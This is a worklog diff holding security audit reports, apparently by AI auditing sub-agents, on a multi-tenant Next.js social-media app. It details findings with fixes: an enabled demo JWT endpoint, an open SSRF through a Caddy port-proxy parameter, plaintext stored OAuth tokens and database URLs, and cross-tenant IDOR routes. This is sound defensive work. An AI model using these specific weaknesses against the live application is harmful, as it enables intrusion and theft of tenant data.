+Because `.env` has `ENABLE_DEMO=true`, the production gate is **bypassed**. Anyone on the internet can `POST /api/auth/demo` and receive a valid JWT for the `viewer` demo user `rabia@synque.app` (with read access across all modules). The middleware allowlists this route as public (`src/middleware.ts:32`).
+
+**Fix**: Set `ENABLE_DEMO=false` (or unset) in the production `.env`. Keep the env var so demo can be enabled explicitly for staging if needed.
+
+---
+
+#### 🟠 HIGH — No Content-Security-Policy anywhere in the app
+
+**Files**: `src/middleware.ts:98-112` (only sets 4 headers), `next.config.ts:1-15` (no headers block), `vercel.json` (no headers), `Caddyfile` (no header directives).
+
+`rg -n "Content-Security-Policy|csp" .` (excluding node_modules / generated) returned **zero hits**. The middleware adds `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy`, `Permissions-Policy`, and `Strict-Transport-Security` — but no CSP. This leaves the app exposed to XSS — a single injected `dangerouslySetInnerHTML` or eval'd script can steal the (non-httpOnly? No, httpOnly is set per SEC-5) cookie via API calls.
+
+**Fix**: Add a CSP header to `addSecurityHeaders()` in `src/middleware.ts`. Start restrictive, e.g.:
+```ts
+res.headers.set(
+  "Content-Security-Policy",
+  "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; " +
+  "style-src 'self' 'unsafe-inline'; img-src 'self' data: https: blob:; " +
+  "font-src 'self' data:; connect-src 'self' https://*.z.ai https://*.up.railway.app; " +
+  "frame-ancestors 'none'; base-uri 'self'; form-action 'self';"
+);
+```
+Tighten `'unsafe-inline'` / `'unsafe-eval'` once nonce-based script CSP is in place.
+
+---
+
+#### 🟠 HIGH — Security headers missing on public routes
+
+**File**: `src/middleware.ts:55-57`
+
+```ts
+if (isPublicRoute(pathname)) {
+  return NextResponse.next();  // ← no addSecurityHeaders(res)
+}
+```
+
+Public routes (`/api/auth/login`, `/api/auth/signup`, `/api/auth/forgot-password`, `/api/auth/demo`, `/api/oauth/callback`, `/api/webauthn/authenticate`, `/api/whatsapp/webhook`, `/api/linkbio`) return responses WITHOUT any security headers. The same applies to the unauthenticated branch (`middleware.ts:73-78`) when no token is present. So the most security-sensitive endpoints (login, signup) have the weakest header posture.
+
+**Fix**: Call `addSecurityHeaders(res)` before returning on every code path. Refactor:
+```ts
+if (isPublicRoute(pathname)) {
+  const res = NextResponse.next();
+  addSecurityHeaders(res);
+  return res;
+}
+// ...
+if (!token) {
+  const res = NextResponse.json({ error: "Authentication required" }, { status: 401 });
+  addSecurityHeaders(res);
+  return res;
+}
+```
+
+---
+
+#### 🟠 HIGH — 97 dependency vulnerabilities (3 critical, 52 high)
+
+**Command**: `bun audit` (output captured)
+
+Critical / notable direct-dependency vulnerabilities:
+- `next@^16.1.1` → **CVE critical**: Unauthenticated Remote Code Execution on Windows-hosted servers (GHSA-p293-qw3h-jr36) and RCE in Image Optimization API with AVIF (GHSA-2xp9-vwfh-vxw4). Plus 20+ high-severity middleware bypass, SSRF, cache poisoning, DoS advisories. **Fix to >=16.2.5**.
+- `next-auth@^4.24.11` → **CVE critical**: Email normalizer homoglyph `@` bypass (GHSA-7rqj-j65f-68wh); high: `getToken()` uncaught exception on malformed Bearer header. **Fix to >=4.24.15**.
+- `sharp@^0.34.3` → High: inherited libvips + libheif CVEs. **Fix to >=0.35.0**.
+- `uuid@^11.1.0` → Moderate: missing buffer bounds check. **Fix to >=11.1.1**.
+- `next-intl@^4.3.4` → Moderate: open redirect (GHSA-8f24-v5vv-gm5j) + prototype pollution. **Fix to >=4.9.1**.
+- `lodash@4.17.22` (via cloudinary, recharts) → High: `_.template` code injection.
+- `mysql2` (via prisma) → High: Auth Plugin Downgrade leaks plaintext credentials.
+- `prismjs` (via react-syntax-highlighter, @mdxeditor/editor) → Moderate: DOM clobbering.
+
+**Fix**: Run `bun update --latest` (breaking changes possible — pin and test). At minimum: bump `next`, `next-auth`, `sharp`, `uuid`, `next-intl` to the patched ranges. Review the 97-advisory list (saved above) for context-dependent risk.
+
+---
+
+#### 🟠 HIGH — No rate limiting on auth endpoints (acknowledged but unfixed)
+
+**File**: prior worklog entry (line ~6902) already noted this; no rate limiting code was added.
+
+`rg -n "rate.?limit|rateLimit|throttle"` returned only matches in `worklog.md`, UI text, and comments — **no actual rate-limit implementation**. Combined with public `/api/auth/login`, `/api/auth/2fa/login`, `/api/auth/forgot-password`, `/api/auth/demo`, this enables:
+- Password brute-force (mitigated only by bcrypt cost factor 12 — ~250ms per attempt server-side, but no IP-level throttle).
+- TOTP brute-force (1 in 333,333 effective per prior analysis).
+- Demo endpoint abuse (unlimited session issuance).
+- Email enumeration via `/api/auth/forgot-password` timing differences.
+
+**Fix**: Add `@upstash/ratelimit` (or similar) middleware in `src/middleware.ts` for auth routes. Suggested limits: 10 login attempts / 15 min / IP, 5 TOTP attempts / 5 min / email, 3 forgot-password / hour / email, 5 demo / hour / IP.
+
+---
+
+#### 🟠 HIGH — No TLS termination / no HTTPS redirect in Caddyfile
+
+**File**: `Caddyfile:1`
+
+```
+:81 {
+    ...
+}
+```
+
+The Caddy gateway listens on plain HTTP port 81 with no `tls` directive, no `redir http→https`, no `header` directives. While Caddy can auto-provision TLS for sites bound on `:443` with a hostname, this config uses a bare port with no hostname — so no cert is issued and all traffic is plaintext. (Note: this is the sandbox gateway, but the pattern would propagate if copied to prod.)
+
+Other Caddyfile gaps:
+- No CORS directives (CORS is left to the app).
+- No rate-limit directives.
+- The `@transform_port_query` block (`Caddyfile:2-13`) lets any client proxy to **any localhost port** via `?XTransformPort=<n>`. This is an open SSRF — an attacker can hit internal services (Postgres, Redis, mini-services) by guessing ports. **Critical if this gateway is internet-reachable.**
+
+**Fix**: Bind Caddy to a real hostname with `tls` (auto Let's Encrypt) or `tls internal`. Add `redir https://{host}{uri} permanent`. Remove the `XTransformPort` reverse_proxy block, or restrict it to a known allowlist of ports. Add `header` block with the same security headers as the app.
+
+---
+
+#### 🟠 HIGH — PWA service worker caches authenticated page navigations
+
+**File**: `public/sw.js:36-44`
+
+```js
+if (url.pathname.startsWith("/api/") || event.request.mode === "navigate") {
+  event.respondWith(
+    fetch(event.request).then((response) => {
+      if (event.request.mode === "navigate" && response.ok) {
+        const clone = response.clone();
+        caches.open(CACHE_NAME).then((cache) => cache.put(event.request, clone));
+      }
+      return response;
+    })
+    .catch(() => caches.match(event.request).then((cached) => cached || caches.match("/")))
+  );
+  return;
+}
+```
+
+The SW caches every successful HTML page navigation (including authenticated dashboard, inbox, reports, etc.) under the same cache key `socialflow-v2`. After logout, these cached pages remain in the cache and can be served on the next offline load — but more importantly, on a shared device the previous user's rendered HTML can be inspected from the cache. There is no eviction on logout and no `Clear-Site-Data` header from the logout endpoint.
+
+The cache key is also static (`socialflow-v2`) — there's no per-user or per-session partitioning.
+
+**Fix**:
+1. Add `Clear-Site-Data: "cache"` header to the `/api/auth/logout` response so the SW cache is wiped on logout.
+2. In the SW, skip caching for navigation requests when the response sets a `Set-Cookie` header (authenticated responses).
+3. Bump the cache name on every deploy (or use a build-hash) to invalidate stale entries.
+
+---
+
+#### 🟠 HIGH — Public/uploads directory served statically with no auth / signed URLs
+
+**File**: `src/lib/storage.ts:63-96` (writes to `public/uploads/tenant_<customerId>/<folder>/<random>-<name>`); served by Next.js at `/uploads/...` via the public dir.
+
+The path is `/uploads/tenant_<customerId>/<folder>/<random6-hex>-<safeName>`. The 6-byte random prefix makes blind enumeration hard (2^48 combinations), but:
+- Any URL ever shared, logged, or appearing in browser history is publicly fetchable with NO auth check.
+- Tenant IDs (`tenant_<customerId>`) are sequential cuid values — if an attacker has one media URL, they know the tenant prefix.
+- No signed URLs, no expiry.
+- `.gitignore` correctly excludes `public/uploads/*`, so uploads aren't committed. Good.
+- `MAX_FILE_SIZE = 25MB` (`storage.ts:64`) is enforced. Good.
+- Path sanitization (`sanitizePathSegment`, `sanitizeFileName`) prevents directory traversal. Good.
+
+**Fix**: For sensitive media, switch to a non-public storage path (`/storage/<key>`) and serve via an authenticated API route that verifies the requester's `customerId` matches the asset's tenant. Cloudinary private URLs (signed) are an option when `STORAGE_PROVIDER=cloudinary`. For non-sensitive media, document the public-by-default behavior clearly.
+
+---
+
+#### 🟠 HIGH — `typescript.ignoreBuildErrors: true` ships type errors to production
+
+**File**: `next.config.ts:6-8`
+
+```ts
+typescript: { ignoreBuildErrors: true },
+```
+
+Type errors are silently ignored on `next build`. This means type-safety regressions (including security-relevant ones — e.g. a `customerId: string | null` becoming `any` and losing tenant scoping) won't block deploys.
+
+**Fix**: Remove `ignoreBuildErrors`, fix the type errors, then re-enable. If some types are unfixable in the short term, narrow the ignore to specific files via `tsconfig` exclude rather than disabling globally.
+
+---
+
+#### 🟡 MEDIUM — `reactStrictMode: false` disables React safety checks
+
+**File**: `next.config.ts:9`
+
+React Strict Mode double-invokes render and effect lifecycle in dev to surface side-effect bugs (e.g. unsafe mutations, missing cleanup). Disabling it means these bugs ship to production silently.
+
+**Fix**: Set `reactStrictMode: true`. Fix any double-render side effects that surface.
+
+---
+
+#### 🟡 MEDIUM — `allowedDevOrigins` allows wildcard subdomains
+
+**File**: `next.config.ts:12`
+
+```ts
+allowedDevOrigins: ["*.space-z.ai", "*.z.ai"],
+```
+
+Dev-only (no prod impact), but wildcard subdomain allowlist means any `*.space-z.ai` subdomain can issue cross-origin dev requests with HMR. If an attacker can register `evil.space-z.ai` they can inject into the dev HMR channel.
+
+**Fix**: Replace wildcards with explicit dev hostnames.
+
+---
+
+#### 🟡 MEDIUM — DB connection strips `channel_binding=require`
+
+**Files**: `src/lib/db.ts:17`, `src/lib/tenant-db.ts:13`, `mini-services/scheduler-service/index.ts:23-25`
+
+```ts
+function cleanUrl(url: string): string {
+  return url.replace(/&?channel_binding=require/g, "").replace(/\?$/, "");
+}
+```
+
+The DB URLs already include `?sslmode=require` (TLS to Neon is enforced), but `channel_binding=require` (which forces SCRAM channel binding to prevent MitM downgrade) is stripped. This is documented as needed for Neon/Prisma compatibility, but it weakens the TLS posture. The `mysql2` advisory (Auth Plugin Downgrade to `mysql_clear_password` leaks plaintext credentials, GHSA-3f6p-5ww8-9rcr) is a related risk for any future MySQL adapter.
+
+**Fix**: Track Prisma / Neon adapter versions that re-support `channel_binding=require` and stop stripping it. Add a comment explaining the trade-off. Verify Neon's `sslmode=require` is actually being honoured at the wire level (check Neon dashboard).
+
+---
+
+#### 🟡 MEDIUM — Mini-services listen on 0.0.0.0 with no auth and no network allowlist
+
+**Files**: `mini-services/ai-service/index.js:112`, `mini-services/zai-proxy/index.js:89`
+
+```js
+server.listen(PORT, "0.0.0.0", () => { ... });
+```
+
+All mini-services bind to all interfaces. On Railway this is necessary (Railway routes the public URL to the port), but it means the service is reachable from the open internet with no auth (see Critical findings above). The WhatsApp scheduler also has no internal firewalling from the AI service etc.
+
+**Fix**: Once `X-Service-Key` auth is added (see Critical fixes), bind to `0.0.0.0` is acceptable. Optionally add Railway-side IP allowlisting for the mini-service URLs so only the Vercel app can call them.
+
+---
+
+#### 🟡 MEDIUM — Error responses sometimes leak raw error messages
+
+**Files** (samples):
+- `src/app/api/reports/custom/route.ts:528` — `{ error: err instanceof Error ? err.message : "..." }`
+- `src/app/api/webauthn/register/verify/route.ts:64`
+- `src/app/api/webauthn/authenticate/verify/route.ts:79`
+- `src/app/api/accounts/[id]/health/route.ts:38` — leaks `detail: err.message`
+- `src/app/api/accounts/health/recalculate/route.ts:40` — leaks `detail`
+- `src/app/api/sync/comments/route.ts:144,148` — leaks error strings
+- `src/app/api/vpn/ip/route.ts:39` — `error = e.message`
+- `src/app/api/media/route.ts:55,92` — `error: err.message`
+
+`err.message` for Prisma errors can include column names, table names, constraint names (e.g. `Foreign key constraint failed on the field: customerId`). For `nodemailer` / `imapflow`, messages can include the SMTP server hostname + response codes. None of these are direct secret leaks, but they aid reconnaissance.
+
+The auth routes (`src/app/api/auth/login/route.ts:97-98`, `signup/route.ts:108`, `demo/route.ts:157`) correctly return generic messages — good pattern, but not applied consistently.
+
+**Fix**: In production, replace all `err.message` client responses with a generic error code, and log the full `err.message` server-side only. Example helper:
+```ts
+function safeError(err: unknown, fallback = "Internal error") {
+  if (process.env.NODE_ENV !== "production") return err instanceof Error ? err.message : fallback;
+  return fallback;
+}
+```
+
+---
+
+#### 🟡 MEDIUM — Inconsistent logging of internal errors near auth/token code
+
+**Files**: many `console.error("[auth/...] ...", e instanceof Error ? e.message : String(e))` in `src/app/api/auth/**` and `src/lib/auth-*.ts` (see Grep results).
+
+These logs write `err.message` (Prisma errors, JWT errors) to stdout/stderr. In Vercel these go to Axiom/Datadog/etc. They do NOT log the JWT itself, the password, or the encryption key (verified by grepping `console.log.*token|console.log.*password|console.log.*secret` near auth — no hits in main app code). The one exception is the AI service startup log (`mini-services/ai-service/index.js:16-22`) which logs the API key value (see Critical).
+
+`src/lib/auth-session.ts:56-58` logs `userAgent` and `ipAddress` to the Session DB row — this is reasonable audit data, not a secret leak.
+
+**Fix**: Already mostly clean. Add a pre-commit lint rule forbidding `console.log` / `console.error` calls whose arguments include any of: `token`, `password`, `secret`, `apiKey`, `Authorization`, `cookie`. Add structured logging (pino) with a redactor.
+
+---
+
+#### 🟡 MEDIUM — PII fields stored in plaintext in the database
+
+**File**: `prisma/schema.prisma` (User model and others)
+
+PII stored as plain `String` columns:
+- `User.email` (`schema.prisma:17`) — unique, indexed, plaintext.
+- `User.phone` (`schema.prisma:33`).
+- `User.birthDate` (`schema.prisma:32`).
+- `User.totpSecret` (`schema.prisma:40`) — base32-encoded TOTP secret, plaintext. If the DB is compromised, 2FA can be bypassed.
+- `PlatformCredential.accessToken`, `accessTokenSecret`, `apiKey`, `apiSecret`, `oauth2UserToken`, `bearerToken` (`schema.prisma` ~lines 730-740) — plaintext OAuth tokens for connected social accounts.
+- `Mailbox.passwordEnc` — encrypted via AES-256-GCM (`src/lib/crypto.ts`) per SEC-4. Good — this is the only correctly-encrypted PII field.
+- `Integration.credentials` (`schema.prisma:739`) — JSON blob; comment says "encrypted API keys, tokens, webhook URLs" but the column is plain `String` and `src/lib/storage.ts:200-209` does `JSON.parse(row.credentials)` without any decrypt call. So the field is **misleadingly named and NOT encrypted** — Cloudinary API secret stored there is plaintext.
+
+Database-level encryption at rest is Neon's responsibility (Neon encrypts at rest by default), but field-level encryption is the app's responsibility and is only applied to mail passwords.
+
+**Fix**:
+1. Apply `encrypt()/decrypt()` from `src/lib/crypto.ts` to `PlatformCredential.accessToken`, `accessTokenSecret`, `apiKey`, `apiSecret`, `oauth2UserToken`, `bearerToken`. These are long-lived credentials that grant posting rights on behalf of users.
+2. Apply the same to `Integration.credentials` (or rename the column to `credentialsJson` if it's intentionally plaintext).
+3. Encrypt `User.totpSecret` — a DB read should not be sufficient to bypass 2FA.
+4. Consider encrypting `User.phone` and `User.birthDate` if those are PII in your jurisdiction (GDPR).
+
+---
+
+#### 🟡 MEDIUM — `Session` table stores raw JWT tokens
+
+**File**: `prisma/schema.prisma` (Session model), `src/lib/auth-session.ts:64` (`token` column = raw JWT string)
+
+The full JWT is stored in the DB so it can be revoked. Storing the raw token means a DB read alone is sufficient to impersonate any user (the JWT is the full credential). Should store only a hash of the token (e.g. `sha256(token)`), so revocation lookups still work but a DB leak doesn't grant session tokens.
+
+**Fix**: Store `crypto.createHash("sha256").update(token).digest("hex")` in `Session.token` and lookup by hash. JWT verification still happens via signature; the DB row is only for revocation.
+
+---
+
+#### 🟡 MEDIUM — No CSRF token (relies on `sameSite: strict` cookie)
+
+**File**: `src/lib/auth-session.ts:97-105` (cookie attributes), no CSRF token middleware.
+
+The auth cookie is `sameSite: "strict"` (per SEC-5), which blocks cross-site requests carrying the cookie. This is a strong defense but not complete: it doesn't protect against same-site CSRF (e.g. a subdomain compromise, or a GET-state-changing endpoint that bypasses the cookie via top-level navigation).
+
+**Fix**: For state-changing routes (POST/PUT/DELETE/PATCH), add a `CSRF` header check (e.g. require `X-Requested-With: XMLHttpRequest` or a double-submit token). Next.js Server Actions already include a built-in CSRF token; ensure regular API routes follow the same pattern.
+
+---
+
+#### 🟢 LOW — `robots.txt` allows all crawlers on all paths
+
+**File**: `public/robots.txt`
+
+```
+User-agent: *
+Allow: /
+```
+
+No `Disallow` for `/api/*`, `/admin/*`, etc. Search engines may index API responses if they're linked. Not a direct vulnerability but increases attack surface (search-engine indexing of internal endpoints).
+
+**Fix**: Add `Disallow: /api/`, `Disallow: /admin/`, etc. Note: this is not a security control — sensitive routes must still be auth-protected.
+
+---
+
+#### 🟢 LOW — `vercel.json` sets no security headers
+
+**File**: `vercel.json`
+
+Only sets `buildCommand`, `framework`, `regions`, and a function `maxDuration`. No `headers` block. Vercel will pass through whatever the app sets, so this is a defense-in-depth gap, not a vulnerability.
+
+**Fix**: Add a `headers` array in `vercel.json` mirroring the middleware headers (CSP, HSTS, etc.) as a static backup.
+
+---
+
+#### ℹ️ INFO — WebSocket / socket.io not used in production app code
+
+**Files**: `examples/websocket/server.ts`, `examples/websocket/frontend.tsx` (examples only, not imported by app). `rg "socket.io|new WebSocket|WebSocketServer"` returned only example code + UI text matches. The real-time features (chat, inbox) use polling via `useApi` hook instead.
+
+**Audit conclusion**: Not applicable — no production WebSocket layer to audit. If socket.io is later added, it must verify the JWT in the `connection` handler (use `io.use((socket, next) => jwtVerify(socket.handshake.auth.token, SECRET))`) before allowing joins, and scope rooms to the tenant (`room:tenant_<customerId>`).
+
+---
+
+#### ℹ️ INFO — Prior security work (SEC-4, SEC-5, SEC-6) verified intact
+
+- `src/lib/crypto.ts` — AES-256-GCM with auth tag, legacy `enc:` fallback. ✓
+- `src/lib/oauth-state.ts` — HMAC-signed OAuth state. ✓
+- `src/app/api/publish/[platform]/route.ts` — module-load guard for `SCHEDULER_API_KEY`, no TS fallback. ✓ (but compiled `index.js` still has fallback — see Critical finding)
+- `src/lib/auth-session.ts` — `httpOnly: true`, `sameSite: "strict"`, `secure` in production. ✓
+- Tenant isolation (`getTenantScope` + `tenantWhere`) applied to bank-accounts, users, inbox, reports. ✓
+
+### Work Log
+
+1. Read `/home/z/my-project/worklog.md` (9,773 lines) for project context, prior SEC-* tasks, and existing architecture decisions.
+2. Read `.env`, `.env.example`, `.gitignore`, `next.config.ts`, `src/middleware.ts`, `Caddyfile`, `package.json`, `prisma/schema.prisma`, `src/lib/storage.ts`, `src/lib/crypto.ts`, `src/lib/auth-guard.ts`, `src/lib/auth-session.ts`, `src/lib/db.ts`, `src/lib/zai.ts`, `public/sw.js`, `public/manifest.json`, `public/robots.txt`, `vercel.json`, `src/components/sw-register.tsx`, `start-dev.sh`, `src/app/api/auth/login/route.ts`, `src/app/api/auth/demo/route.ts`, `src/app/api/publish/[platform]/route.ts`.
+3. Read all 4 mini-services: `mini-services/scheduler-service/{index.ts,index.js,Dockerfile,package.json}`, `mini-services/whatsapp-service/{index.ts,index.js,Dockerfile,package.json}`, `mini-services/ai-service/{index.js,package.json,Dockerfile}`, `mini-services/zai-proxy/index.js`.
+4. Ran `bun audit` — captured 97 vulnerabilities (3 critical, 52 high, 37 moderate, 5 low).
+5. Ran `git log --all -p -- .env` to inspect secret-bearing history.
+6. Ran `rg` greps for: `Access-Control-Allow-Origin`, `console.log` near auth code, hardcoded API keys / tokens, `Content-Security-Policy`, `rate.?limit`, `sslmode|channel_binding`, `err.message` in client responses, `encrypt` in schema.
+7. Cross-referenced prior SEC-4/5/6 entries to avoid re-reporting fixed issues; identified that the **compiled** scheduler `index.js` still contains the SEC-5-fixed fallback (Critical regression).
+8. Composed this report with severity ratings + concrete fixes for each finding.
+
+### Stage Summary
+
+**Critical (6)** — production secrets in git history; hardcoded Z.AI credentials in zai-proxy; WhatsApp / AI / zai-proxy services fully unauthenticated; compiled scheduler still ships the SEC-5-fixed hardcoded API key fallback. **All six require immediate remediation and secret rotation.**
+
+**High (8)** — demo endpoint enabled in production; no CSP anywhere; security headers missing on public routes; 97 dependency vulnerabilities (incl. critical Next.js + next-auth CVEs); no rate limiting on auth endpoints; Caddyfile has no TLS / no rate limit / open SSRF via `XTransformPort`; PWA service worker caches authenticated pages; uploads directory publicly served with no signed URLs; `typescript.ignoreBuildErrors: true` ships type errors.
+
+**Medium (7)** — `reactStrictMode: false`; `allowedDevOrigins` wildcard subdomains; DB strips `channel_binding=require`; mini-services bind `0.0.0.0` with no auth; error responses leak raw `err.message`; inconsistent logging near auth code; PII fields (TOTP secret, OAuth tokens, Integration.credentials) stored in plaintext despite the `passwordEnc` naming convention; `Session.token` stored as raw JWT instead of hash; no CSRF token (relies on sameSite:strict alone).
+
+**Low (2)** — `robots.txt` allows all paths; `vercel.json` sets no security headers.
+
+**Info (2)** — no production WebSocket layer (examples only); prior SEC-4/5/6 fixes verified intact (with the SEC-5 regression noted).
+
+**Top 3 actions (highest impact, lowest effort)**:
+1. Rotate all leaked secrets (Neon DB password, JWT_SECRET, ENCRYPTION_KEY, SCHEDULER_API_KEY, CLOUDINARY_API_SECRET, ZAI_TOKEN) and purge `.env` from git history with `git filter-repo`.
+2. Add `X-Service-Key` (or shared JWT) auth to all three mini-services (WhatsApp, AI, zai-proxy); remove hardcoded credentials from `zai-proxy/index.js`.
+3. Rebuild and redeploy the scheduler `index.js` bundle so the SEC-5 fix actually takes effect on Railway.
+
+No code changes were made — this is an audit-only task. Implementation of fixes should be tracked under new SEC-7+ task IDs.
+
+---
+
+## Task ID: SECURITY-DATA
+
+**Agent**: security-auditor (general-purpose sub-agent)
+**Task**: Audit data protection, privacy, and tenant isolation of the Next.js multi-tenant app at `/home/z/my-project` (Prism Social / SYNQUE).
+
+### Scope reviewed
+- `prisma/schema.prisma` (full data model, 955 lines, 35+ models)
+- `src/lib/tenant-db.ts`, `src/lib/auth-guard.ts`, `src/lib/crypto.ts`, `src/lib/storage.ts`
+- `src/middleware.ts` (global JWT gate)
+- ~75 route handlers under `src/app/api/` (every file under each sub-folder)
+- `mini-services/whatsapp-service/index.ts` (WhatsApp Baileys bridge)
+
+### Work Log
+
+The audit confirms a multi-tenant SaaS where most tables carry an optional `customerId?` column and a `getTenantScope()` / `tenantWhere()` helper pair exists in `src/lib/auth-guard.ts:195-219`. A global Edge middleware (`src/middleware.ts`) enforces JWT auth on every `/api/*` route except a small explicit allowlist. These primitives are correct — but they are applied inconsistently across ~75 routes, leaving broad cross-tenant data leaks and IDORs. Several routes that mutate data have NO handler-level auth check at all (they rely entirely on middleware, with no tenant scoping).
+
+The findings below are ordered by severity. Each includes the file:line citation and a concrete fix.
+
+---
+
+### PII inventory (which tables hold what, where)
+
+| Model | PII held | File:line |
+|---|---|---|
+| `User` | name, email, hashed password, phone, gender, birthDate, bio, timezone, language, totpSecret, avatar, lastActive, IP-derived session data | `prisma/schema.prisma:14-57` |
+| `Account` | platform handle, displayName, avatar, ownerId | `prisma/schema.prisma:59-83` |
+| `Comment` | external author name + avatar + text + replyText + assigneeId | `prisma/schema.prisma:188-212` |
+| `Mention` | external author + avatar + text (brand-monitoring scrape) | `prisma/schema.prisma:295-312` |
+| `WhatsAppMessage` | senderName, senderPhone (E.164), groupName, content, mediaUrl | `prisma/schema.prisma:432-454` |
+| `WhatsAppConnection` | phone (E.164 of connected WA number) | `prisma/schema.prisma:457-468` |
+| `ChatMessage` | senderId, receiverId, text, fileUrl, fileName | `prisma/schema.prisma:471-488` |
+| `MailServer` | username, passwordEnc, fromEmail, imapHost, smtpHost | `prisma/schema.prisma:491-511` |
+| `Mailbox` | email, displayName, passwordEnc, ownerId | `prisma/schema.prisma:513-529` |
+| `MailMessage` | fromAddr, toAddr, subject, body | `prisma/schema.prisma:531-549` |
+| `Customer` | name, email, phone, company, address, city, country | `prisma/schema.prisma:552-570` |
+| `BankAccount` | accountName, accountNumber, iban, swift (financial PII) | `prisma/schema.prisma:626-639` |
+| `SerialKey` | key, deviceFingerprint | `prisma/schema.prisma:572-584` |
+| `Device` | deviceName, fingerprint, ipAddress, location | `prisma/schema.prisma:653-665` |
+| `Subscription` / `Invoice` / `Quotation` | billing PII (customer-linked) | `prisma/schema.prisma:586-624, 668-682` |
+| `ApiKey` | key (full plaintext on creation) | `prisma/schema.prisma:642-650` |
+| `PlatformCredential` | clientId, clientSecret, apiKey, apiSecret, accessToken, accessSecret, bearerToken, oauth2UserToken, pageId, profileId — full OAuth + social-platform credentials | `prisma/schema.prisma:703-732` |
+| `Integration` | credentials JSON (Stripe secretKey + webhookSecret, OpenAI/Claude/Gemini API keys, Cloudinary apiSecret, Slack webhookUrl, Unsplash keys) | `prisma/schema.prisma:735-745` |
+| `TenantDatabase` | dbUrl (full Neon connection string with password!) | `prisma/schema.prisma:748-755` |
+| `Session` | userId, token (JWT for revocation), userAgent, ipAddress | `prisma/schema.prisma:830-842` |
+| `PasswordResetToken` / `EmailVerificationToken` | email, token | `prisma/schema.prisma:845-866` |
+| `Influencer` | name, handle | `prisma/schema.prisma:871-886` |
+| `VPNSession` | userId, privateKey (Curve25519!), publicKey, clientAddress, lastVerifiedIp, config (full WireGuard .conf incl. private key) | `prisma/schema.prisma:916-936` |
+| `WebAuthnCredential` | userId, publicKey, counter, transports | `prisma/schema.prisma:939-954` |
+| `Activity` | userId + description (often contains post titles, handles) | `prisma/schema.prisma:229-243` |
+
+---
+
+### Finding 1 — `PlatformCredential` stores OAuth tokens / API secrets in PLAINTEXT
+
+**Severity: Critical**
+
+The schema (`prisma/schema.prisma:703-732`) declares `clientSecret`, `apiSecret`, `accessToken`, `accessSecret`, `bearerToken`, `oauth2UserToken` as plain `String?`. The route `/api/platform-credentials/route.ts:53-61` saves these via `data.clientSecret = clientSecret` etc. — no `encrypt()` call. By contrast `MailServer.passwordEnc` correctly uses `encrypt()` (`/api/mail/route.ts:91`), proving the codebase has an AES-256-GCM helper available (`src/lib/crypto.ts`).
+
+A single DB read (backup leak, SQL injection, misconfigured `prisma studio`, read-only replica) exposes every connected Twitter/Instagram/Facebook/LinkedIn/TikTok/YouTube OAuth token for every tenant.
+
+**Fix:** Apply `encrypt()` from `src/lib/crypto.ts` to all six secret fields on write; transparently `decrypt()` on read in the two places that use them (`/api/platform-credentials/[platform]/sync/route.ts:54-65`, `/api/publish/[platform]/route.ts`, `/api/listening/[id]/reply/route.ts:79,107`). Run a one-time migration script to encrypt existing rows.
+
+---
+
+### Finding 2 — `Integration.credentials` stores third-party API keys (Stripe, OpenAI, Cloudinary, Slack, Anthropic, Gemini) in PLAINTEXT JSON
+
+**Severity: Critical**
+
+`/api/integrations/route.ts:184` and `:191` save `credentials: JSON.stringify(credentials)` — a plain JSON string of every secret. The schema comment at `prisma/schema.prisma:739` even claims "encrypted API keys" but no encryption is applied. Worse, the `Integration` table has NO `customerId` column (`type` is `@unique`), so Stripe secretKey / OpenAI apiKey / Cloudinary apiSecret / Anthropic apiKey / Slack webhookUrl are SHARED across all tenants. A tenant admin (any customer who pays) can overwrite the global Stripe key by POSTing to `/api/integrations` (`requireRole("admin")` accepts tenant admins), redirecting all payments to their own Stripe account.
+
+**Fix:**
+1. Run each field of `credentials` through `encrypt()` before `JSON.stringify` on write (`src/app/api/integrations/route.ts:184,191`).
+2. Add a `customerId` column to `Integration` so each tenant has its own row, OR explicitly document that integrations are platform-global and require super-admin (not tenant-admin) to mutate.
+3. The GET at `/api/integrations/[type]/route.ts:23` correctly masks values, but the `text`-type fields leak `value.slice(0,4)` (Cloudinary cloud name, Stripe publishableKey prefix, OpenAI model name). Tighten to fully mask text fields too, or only return `configured: boolean`.
+
+---
+
+### Finding 3 — `TenantDatabase.dbUrl` stored in plaintext (contains Neon DB password)
+
+**Severity: Critical**
+
+`/api/customers/route.ts:131` writes `dbUrl` (full `postgresql://user:pass@host/db?sslmode=require`) into the `TenantDatabase` table as plaintext. The GET at `/api/customers/route.ts:82-96` correctly omits `dbUrl` from the response, but the value is still on disk and accessible through any DB read. A DB backup leak or admin-panel prisma-studio access exposes credentials for every tenant's dedicated database.
+
+**Fix:** Encrypt `dbUrl` with `encrypt()` on write (`src/app/api/customers/route.ts:131`), decrypt lazily in `getTenantDb()` (`src/lib/tenant-db.ts:28`). Rotate the Neon password and re-encrypt all rows.
+
+---
+
+### Finding 4 — Widespread cross-tenant IDOR / missing tenant scoping
+
+**Severity: Critical**
+
+`getTenantScope` / `tenantWhere` exist (`src/lib/auth-guard.ts:195-219`) but are applied in only ~23 of ~75 routes. The remaining routes do `db.<model>.update/delete/findUnique({ where: { id } })` with no tenant filter, allowing any logged-in user (in any tenant) to read/modify/delete any other tenant's records by ID. Confirmed IDOR / cross-tenant leaks:
+
+| Route | File:line | Impact |
+|---|---|---|
+| `PATCH /api/posts/[id]`, `DELETE /api/posts/[id]` | `src/app/api/posts/[id]/route.ts:6-96` | Edit/delete any post across tenants (Post.customerId exists but is never set or filtered) |
+| `GET /api/posts` | `src/app/api/posts/route.ts:6-54` | List ALL posts across all tenants (no tenant filter at all) |
+| `POST /api/posts` | `src/app/api/posts/route.ts:56-101` | Create post with no `customerId` stamp — post is orphaned/visible to everyone |
+| `PATCH/DELETE /api/accounts/[id]` | `src/app/api/accounts/[id]/route.ts:6-26` | Edit/delete any account by ID — DELETE cascades analytics, comments, variants |
+| `GET /api/analytics?accountId=<other-tenant-id>` | `src/app/api/analytics/route.ts:41,50,72` | Read analytics for any account by ID |
+| `GET/POST/PATCH /api/campaigns` (+ `[id]`) | `src/app/api/campaigns/route.ts:1-43` | No tenant filter on Campaign despite schema having `customerId?` |
+| `GET/PATCH/DELETE /api/hashtags` (+ `[id]`) | `src/app/api/hashtags/route.ts:1-35` | HashtagGroup has NO `customerId` column at all — global table |
+| `GET/POST /api/influencers` (+ `[id]`) | `src/app/api/influencers/route.ts:1-92` | Same — no customerId column |
